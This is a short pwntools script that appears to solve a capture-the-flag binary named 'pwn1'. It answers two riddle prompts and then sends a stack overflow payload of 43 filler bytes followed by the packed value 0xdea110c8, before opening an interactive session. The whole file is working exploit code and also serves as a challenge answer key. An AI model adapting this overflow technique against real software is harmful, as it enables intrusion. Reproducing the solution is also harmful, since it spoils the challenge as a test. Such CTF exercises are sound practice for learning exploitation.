from pwn import *

target = process("./pwn1")

payload = b'0'*43 + p32(0xdea110c8)

target.sendline("Sir Lancelot of Camelot")
target.sendline("To seek the Holy Grail.")
target.sendline(payload)

target.interactive()
